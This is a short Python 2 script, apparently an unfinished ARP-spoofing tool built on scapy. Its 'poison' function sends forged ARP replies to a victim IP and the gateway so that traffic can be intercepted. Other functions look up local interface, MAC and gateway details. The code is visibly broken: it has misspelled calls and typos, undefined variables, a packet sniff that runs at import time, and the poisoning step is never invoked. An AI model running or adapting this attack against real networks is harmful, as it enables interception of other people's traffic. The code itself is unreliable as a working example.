#!/usr/bin/python
from scapy.all import *
import argparse
import signal
import sys
import logging
import time
import thread
import netifaces

def GetIface():
	inter = []
	i = 1
	for iface in netifaces.interfaces():
		inter.append(iface)
		print i+'.'+ iface
		i += 1
	num = input("interface:")
	return inter[num-1]
	
def GetMyMac(interface):
	interInfo = netifaces.ifaddress(interface);
	return interInfo[netifaces.AF_PACKET][0]['addr']
def GetMyIP(interface):
	interInfo = netifaces.ifaddress(interface);
	return interInfo[netifaces.AF_INET][0]['addr']
def GetMyGateway(interface):
	return netifaces.gateways()['default'][netifaces.AF_INET][0]

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP")
    return parser.parse_args()

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="00:00:00:00:00:00", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="00:00:00:00:00:00", hwsrc=routerMAC), count=3)
    sys.exit("losing...")
def arp_monitor_callback(pkt):
	if ARP in pky and pkt[ARP].op in (1,2):
		return pkt.sprintf("%ARP.hwscr% %ARP.psrc%")
sniff(prn=arp_monitor_callback,filter="arp",store=0)
def main(args):
    iface = GetIface()
    MyMac = GetMyMac(iface)
    MyIP  = GetMyIP(iface)
    MyGateway = GetMyGateway(iface)
    VI_IP = args[0]
    ###gatewayMAc
    Pkt = Ether(src=MyMac,dst='ff:ff:ff:ff:ff:ff',type=2054)/ARP(hwdst='00:00:00:00:00:00',ptype=2048,hwtype=1,psrc=MyIP,hwlen=6,plen=4,pdst=VI_IP,hwsrc=MyMac, op=ARP.who_has)
    while GatewayM == "":
	send(Pkt)
	GatewayM = pipe.recv()
	print GatewayM
    ###Victm MAc
    Pkt = Ether(src=MyMac,dst='ff:ff:ff:ff:ff:ff',type=2054)/ARP(hwdst='00:00:00:00:00:00',ptype=2048,hwtype=1,psrc=MyIP,hwlen=6,plen=4,pdst=VI_IP,hwsrc=MyMac, op=ARP.who_has)
    while V_M == "":
        send(Pkt)
        V_M = pipe.recv()
        print V_M

   ####ARP
if __name__ == "__main__":
 main(parse_args())

